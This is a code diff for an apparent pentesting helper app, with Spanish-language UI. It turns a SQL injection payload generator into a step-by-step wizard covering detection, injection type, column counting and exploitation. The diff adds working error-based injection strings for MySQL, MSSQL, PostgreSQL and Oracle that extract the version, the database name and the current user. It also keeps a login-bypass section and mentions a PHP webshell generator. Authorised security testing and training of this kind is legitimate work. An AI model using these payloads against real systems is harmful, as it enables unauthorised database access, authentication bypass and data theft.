@@ -5134,16 +5134,16 @@ function wvPayloadCard(code, desc){
   </div>`;
 }
 
-// ─── Generador SQLi (motor de BD + categorías, blind y enumeración) ───────────
-const SQLI_CATS=[
-  {id:'detect',      label:'Detección'},
-  {id:'fingerprint', label:'¿Qué BD es?'},
-  {id:'login',  label:'Bypass login'},
-  {id:'union',  label:'UNION'},
-  {id:'enum',   label:'Enumeración BD'},
-  {id:'bool',   label:'Blind booleano'},
-  {id:'time',   label:'Blind time'},
-];
+// ─── Generador SQLi — asistente por fases (detectar → tipo → columnas → explotar) ─
+// Los 4 tipos de SQLi. error y union son in-band (el dato vuelve por la respuesta
+// normal: en las filas mostradas -union- o dentro del error -error-); bool y time
+// son blind (se infiere el dato).
+const SQLI_TYPES={
+  union:{label:'UNION-based', tag:'in-band', hint:'ves los datos de la query en la página'},
+  error:{label:'Error-based', tag:'in-band', hint:'no ves datos, pero la app muestra errores SQL'},
+  bool: {label:'Blind booleano', tag:'blind', hint:'la respuesta cambia con verdadero/falso, sin ver datos'},
+  time: {label:'Blind por tiempo', tag:'blind', hint:'solo lo notas por el retardo (ni datos ni errores)'},
+};
 const SQLI_DB={
   mysql:   {name:'MySQL/MariaDB', c:'-- -', ver:'@@version',  timeInj:"' AND SLEEP(5)-- -"},
   mssql:   {name:'MSSQL',         c:'--',   ver:'@@version',  timeInj:"'; WAITFOR DELAY '0:0:5'--"},
@@ -5192,21 +5192,76 @@ function sqliPayloads(dbms, cat){
     case 'time': return [
       {code:db.timeInj, d:'Si la respuesta tarda ~5s, la inyección es válida (útil cuando no hay salida visible)'},
     ];
+    case 'error': return ({
+      mysql:[
+        {code:"' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- -", d:'MySQL: el error XPATH muestra el dato tras el «~». Cambia la subconsulta por lo que quieras leer'},
+        {code:"' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -", d:'MySQL: igual con updatexml — aquí saca la BD actual'},
+      ],
+      mssql:[
+        {code:"' AND 1=CONVERT(int,(SELECT @@version))-- ", d:'MSSQL: el error de conversión a int incluye la versión en el mensaje'},
+        {code:"' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sys.databases))-- ", d:'MSSQL: saca el primer nombre por el error de conversión'},
+      ],
+      postgres:[
+        {code:"' AND 1=CAST((SELECT version()) AS int)-- ", d:'PostgreSQL: el CAST a int falla y el error muestra el texto (la versión)'},
+        {code:"' AND 1=CAST((SELECT current_database()) AS int)-- ", d:'PostgreSQL: la BD actual vía error de CAST'},
+      ],
+      oracle:[
+        {code:"' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- ", d:'Oracle: el error de esta función incluye el dato'},
+        {code:"' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))-- ", d:'Oracle: el error de resolución incluye el usuario actual'},
+      ],
+    })[dbms] || [];
   }
   return [];
 }
-let _sqliCat='detect';
-function setSqliCat(c){ _sqliCat=c; renderSqliGen(); }
+// Estado del asistente: fase (1-4) y tipo de SQLi elegido.
+let _sqliPhase=1, _sqliType=null;
+function resetSqliGen(){ _sqliPhase=1; _sqliType=null; renderSqliGen(); }
+function setSqliPhase(n){ _sqliPhase=n; renderSqliGen(); }
+function setSqliType(t){ _sqliType=t; _sqliPhase = (t==='union')?3:4; renderSqliGen(); }
+function _sqliNav(n,label){ return `<button onclick="setSqliPhase(${n})" style="margin-top:10px;padding:6px 14px;border-radius:6px;border:1px solid var(--cyan);background:rgba(0,221,255,.1);color:var(--cyan);cursor:pointer;font-family:var(--mono);font-size:11px;">${label}</button>`; }
+function _sqliCards(dbms,cat){ return sqliPayloads(dbms,cat).map(p=>wvPayloadCard(p.code,p.d)).join(''); }
+
 function renderSqliGen(){
   const dbms=document.getElementById('sqliDbms')?.value||'mysql';
-  const btns=document.getElementById('sqliCatBtns');
-  if(btns) btns.innerHTML=SQLI_CATS.map(cat=>`<button class="enum-toggle ${cat.id===_sqliCat?'active':''}" onclick="setSqliCat('${cat.id}')">${esc(cat.label)}</button>`).join('');
   const out=document.getElementById('sqliGenOut');
   if(!out) return;
-  const head=_sqliCat==='fingerprint'
-    ? `<div class="enum-note" style="margin-bottom:8px;">Prueba estos para saber el motor. Cuando lo identifiques, selecciónalo arriba en «Motor de BD» y las demás categorías se adaptan a su sintaxis.</div>`
-    : '';
-  out.innerHTML=head+sqliPayloads(dbms,_sqliCat).map(p=>wvPayloadCard(p.code,p.d)).join('');
+
+  // Stepper de las 4 fases (la 3, columnas, solo aplica a UNION)
+  const steps=[[1,'Detectar'],[2,'Tipo'],[3,'Columnas'],[4,'Explotar']];
+  const stepper=`<div style="display:flex;gap:4px;margin-bottom:12px;flex-wrap:wrap;">`+steps.map(([n,lbl])=>{
+    const na=(n===3 && _sqliType && _sqliType!=='union');
+    const act=n===_sqliPhase;
+    return `<button onclick="setSqliPhase(${n})" ${na?'disabled':''} style="flex:1;min-width:82px;font-size:10px;font-family:var(--mono);padding:5px 6px;border-radius:6px;cursor:${na?'not-allowed':'pointer'};border:1px solid ${act?'var(--cyan)':'var(--border)'};background:${act?'rgba(0,221,255,.12)':'var(--bg3)'};color:${na?'var(--text3)':act?'var(--cyan)':'var(--text2)'};opacity:${na?.5:1};">${n}. ${lbl}${na?' (n/a)':''}</button>`;
+  }).join('')+`</div>`;
+
+  let body='';
+  if(_sqliPhase===1){
+    body=`<div class="enum-note" style="margin-bottom:8px;">Confirma que hay inyección. Según cómo reaccione ya intuyes el tipo: <b>error SQL</b> → error-based · <b>ves la salida</b> de la query → UNION · <b>respuesta distinta</b> verdadero/falso (sin ver datos) → blind booleano · <b>retardo</b> con el sleep → blind por tiempo.</div>`
+      + _sqliCards(dbms,'detect')
+      + wvPayloadCard(SQLI_DB[dbms].timeInj,'Con retardo confirmas la SQLi Y, de paso, que es blind por tiempo')
+      + _sqliNav(2,'Elegir el tipo →');
+  } else if(_sqliPhase===2){
+    body=`<div class="enum-note" style="margin-bottom:8px;">¿Cómo te vuelve el dato? Elige el tipo y el flujo se adapta. <b>UNION</b> y <b>error-based</b> son in-band; <b>booleano</b> y <b>tiempo</b> son blind.</div>`
+      + Object.entries(SQLI_TYPES).map(([id,t])=>`<button onclick="setSqliType('${id}')" style="display:block;width:100%;text-align:left;margin-bottom:6px;padding:9px 12px;border-radius:6px;border:1px solid ${_sqliType===id?'var(--cyan)':'var(--border2)'};background:var(--bg3);color:var(--text);cursor:pointer;">
+        <span style="font-family:var(--mono);font-size:12px;font-weight:700;color:var(--cyan);">${t.label}</span>
+        <span style="font-size:9px;color:var(--text3);border:1px solid var(--border);border-radius:8px;padding:1px 6px;margin-left:6px;">${t.tag}</span>
+        <div style="font-size:11px;color:var(--text3);margin-top:2px;">${t.hint}</div></button>`).join('');
+  } else if(_sqliPhase===3){
+    body=_sqliType==='union'
+      ? `<div class="enum-note" style="margin-bottom:8px;">Averigua cuántas columnas devuelve la query (para que el UNION cuadre) y cuáles se ven en la página.</div>`+_sqliCards(dbms,'union')+_sqliNav(4,'Explotar →')
+      : `<div class="enum-note">El nº de columnas solo hace falta para UNION. Con «${SQLI_TYPES[_sqliType]?.label||'este tipo'}» ve directo a Explotar.</div>`+_sqliNav(4,'Explotar →');
+  } else if(_sqliPhase===4){
+    if(!_sqliType) body=`<div class="enum-note">Primero elige el tipo en la Fase 2.</div>`+_sqliNav(2,'← Elegir tipo');
+    else if(_sqliType==='union') body=`<div class="enum-note" style="margin-bottom:8px;">Identifica el motor y enumera: tablas → columnas → volcado.</div>`
+      +`<div class="svc-lbl" style="margin:6px 0;">Fingerprint del motor</div>`+_sqliCards(dbms,'fingerprint')
+      +`<div class="svc-lbl" style="margin:10px 0 6px;">Enumeración</div>`+_sqliCards(dbms,'enum');
+    else if(_sqliType==='error') body=`<div class="enum-note" style="margin-bottom:8px;">Fuerzas errores cuyo texto contenga el dato (sacas un valor por error). Requiere que la app muestre los errores SQL.</div>`+_sqliCards(dbms,'error');
+    else if(_sqliType==='bool') body=`<div class="enum-note" style="margin-bottom:8px;">Extracción carácter a carácter según cambie la respuesta (verdadero/falso).</div>`+_sqliCards(dbms,'bool');
+    else if(_sqliType==='time') body=`<div class="enum-note" style="margin-bottom:8px;">Extracción carácter a carácter midiendo el retardo (cuando no hay ni datos ni errores).</div>`+_sqliCards(dbms,'time');
+  }
+  // Extra siempre visible: bypass de login (es un caso aparte del flujo de extracción)
+  const login=`<div style="margin-top:14px;border-top:1px solid var(--border);padding-top:10px;"><div class="svc-lbl" style="margin-bottom:6px;">Aparte — Bypass de login</div>`+_sqliCards(dbms,'login')+`</div>`;
+  out.innerHTML=stepper+body+login;
 }
 
 // ─── Generador de webshells PHP (parámetro editable) ──────────────────────────
@@ -5260,12 +5315,8 @@ function openWebVuln(id){
             <option value="oracle">Oracle</option>
           </select>
         </div>
-        <div class="enum-gen-row" style="align-items:flex-start;">
-          <span class="enum-gen-label">Objetivo</span>
-          <div id="sqliCatBtns" class="enum-toggle-row" style="margin:0;"></div>
-        </div>
         <div class="enum-note" style="margin-top:8px;">⚠ Payloads orientativos: la sintaxis exacta (sobre todo el blind en MSSQL/PostgreSQL/Oracle) depende del contexto de la inyección. En MySQL suelen ir directos; en el resto, ajústala si hace falta.</div>
-        <div id="sqliGenOut" style="margin-top:8px;"></div>
+        <div id="sqliGenOut" style="margin-top:10px;"></div>
       </div></div>`;
   }
 
@@ -5301,7 +5352,7 @@ function openWebVuln(id){
 
   d.innerHTML=html;
   const sc=document.getElementById('webvulnScroll'); if(sc) sc.scrollTop=0;
-  if(v.generator){ _sqliCat='detect'; renderSqliGen(); }
+  if(v.generator){ resetSqliGen(); }
 }
 
 // ─── DICTIONARIES & POLYGLOTS ─────────────────────────────────────────────────
